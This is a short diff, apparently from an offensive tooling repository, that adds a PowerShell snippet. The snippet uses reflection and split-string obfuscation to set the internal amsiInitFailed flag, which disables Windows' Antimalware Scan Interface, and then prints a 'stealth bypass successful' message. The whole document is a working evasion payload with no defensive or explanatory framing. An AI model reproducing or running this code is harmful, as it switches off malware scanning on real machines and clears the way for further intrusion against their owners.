@@ -1,0 +1,4 @@
+$asm = [Ref].Assembly
+$utils = $asm.GetType(('System.Management.Automation.{0}' -f 'AmsiUtils'))
+$flag = $utils.GetField(('am{0}InitFailed' -f 'si'), 'NonPublic,Static')
+$flag.SetValue($null, $true);Write-Host "[+] Stealth AMSI bypass successful" -ForegroundColor Green
